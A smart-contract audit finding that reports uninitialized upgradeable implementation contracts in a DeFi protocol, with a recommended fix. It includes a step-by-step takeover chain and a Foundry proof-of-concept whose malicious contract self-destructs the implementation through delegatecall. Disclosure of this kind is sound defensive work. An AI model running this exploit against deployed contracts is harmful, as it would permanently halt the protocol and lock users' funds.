### Title
Uninitialized `Endpoint` Implementation Contract Allows Attacker to Seize Ownership and Destroy It via `delegatecall` — (File: `core/contracts/Endpoint.sol`)

---

### Summary

`Endpoint.sol` is deployed behind an upgradeable proxy but its implementation contract has no constructor calling `_disableInitializers()`. An unprivileged attacker can call `initialize()` directly on the implementation, set `endpointTx` to a malicious contract, and then invoke the public `submitSlowModeTransaction()` function, which triggers `_delegatecallEndpointTx`. The malicious `endpointTx` can execute `selfdestruct` in the context of the implementation, destroying it and bricking every proxy that points to it. The same root cause exists in `Clearinghouse.sol`, `SpotEngine.sol`, `PerpEngine.sol`, and `OffchainExchange.sol`.

---

### Finding Description

`Endpoint` inherits `OwnableUpgradeable` and `EIP712Upgradeable` and is deployed as a proxy target. Its `initialize()` function is guarded only by the `initializer` modifier, which prevents re-initialization of the *proxy* but leaves the bare implementation contract open to a first-call initialization by anyone. [1](#0-0) 

There is no constructor on `Endpoint` that calls `_disableInitializers()`. Contrast this with `Verifier`, `Airdrop`, `BaseWithdrawPool`, `ContractOwner`, and `BaseProxyManager`, all of which correctly include:

```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
``` [2](#0-1) [3](#0-2) 

`Endpoint` is missing this protection entirely. [4](#0-3) 

The `initialize()` call sets `endpointTx`, which is the target of every subsequent `delegatecall` inside the contract: [5](#0-4) 

`submitSlowModeTransaction()` is a public, access-control-free entry point that unconditionally calls `_delegatecallEndpointTx`: [6](#0-5) 

`endpointTx` is stored in `EndpointStorage`: [7](#0-6) 

**Attack chain on the implementation contract:**

1. Attacker calls `Endpoint_impl.initialize(attacker, attacker, attacker, ..., maliciousEndpointTx)`.
2. Attacker is now `owner` and `sequencer`; `endpointTx` points to a malicious contract.
3. Attacker calls `Endpoint_impl.submitSlowModeTransaction(anyBytes)`.
4. `_delegatecallEndpointTx` fires `maliciousEndpointTx.delegatecall(...)`.
5. The malicious contract executes `selfdestruct(attacker)` in the context of the implementation.
6. The implementation bytecode is erased; every proxy pointing to it becomes permanently non-functional.

The same missing `_disableInitializers()` pattern exists in:

- `Clearinghouse.sol` — `initialize()` at line 25, no constructor
- `SpotEngine.sol` — `initialize()` at line 14, no constructor
- `PerpEngine.sol` — `initialize()` at line 14, no constructor
- `OffchainExchange.sol` — `initialize()` at line 243, no constructor [8](#0-7) [9](#0-8) [10](#0-9) [11](#0-10) 

---

### Impact Explanation

If the `Endpoint` implementation is destroyed, every proxy delegating to it reverts on all calls. This freezes the entire Nado protocol: no deposits, no withdrawals, no slow-mode transactions, no sequencer submissions. User funds locked in the `Clearinghouse` become inaccessible. The same destruction of `Clearinghouse`, `SpotEngine`, or `PerpEngine` implementations would have equivalent protocol-halting effects. This is a complete, irreversible denial of service with permanent asset lock risk.

---

### Likelihood Explanation

The attack requires no special privilege. The implementation contract address is publicly discoverable from the proxy's EIP-1967 storage slot. The `initialize()` function is callable by anyone on the uninitialized implementation. `submitSlowModeTransaction()` has no access control. The only prerequisite is that Ink Chain has not yet deployed EIP-6780 (Dencun), which restricts `selfdestruct` to contracts created in the same transaction. Even if Dencun is active, the attacker still gains ownership of the implementation and can call `onlyOwner` functions on it directly, which is a weaker but still valid concern.

---

### Recommendation

Add the following constructor to `Endpoint`, `Clearinghouse`, `SpotEngine`, `PerpEngine`, and `OffchainExchange`:

```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
```

For already-deployed implementation contracts, call `initialize()` on each one with dummy/safe values to lock the initializer before an attacker does.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

interface IEndpoint {
    function initialize(
        address _sanctions,
        address _sequencer,
        address _offchainExchange,
        address _clearinghouse,
        address _verifier,
        address _endpointTx
    ) external;

    function submitSlowModeTransaction(bytes calldata transaction) external;
    function sequencer() external view returns (address);
}

contract MaliciousEndpointTx {
    // Matches EndpointTx.submitSlowModeTransactionImpl selector
    fallback() external {
        selfdestruct(payable(msg.sender)); // executes in context of Endpoint impl
    }
}

contract NadoEndpointImplTest is Test {
    // Replace with actual Endpoint implementation address (from EIP-1967 slot of proxy)
    IEndpoint impl = IEndpoint(ENDPOINT_IMPL_ADDRESS);

    function test_TakeoverAndDestroy() public {
        MaliciousEndpointTx malicious = new MaliciousEndpointTx();

        // Step 1: Initialize the unprotected implementation
        impl.initialize(
            address(this), // sanctions (stub)
            address(this), // sequencer = attacker
            address(this), // offchainExchange (stub)
            address(this), // clearinghouse (stub)
            address(this), // verifier (stub)
            address(malicious) // endpointTx = malicious contract
        );

        console.log("Implementation code size before:", address(impl).code.length);

        // Step 2: Trigger delegatecall -> selfdestruct on the implementation
        impl.submitSlowModeTransaction(hex"00");

        console.log("Implementation code size after:", address(impl).code.length);
        // Expected: 0 — implementation destroyed, all proxies bricked
    }
}
```
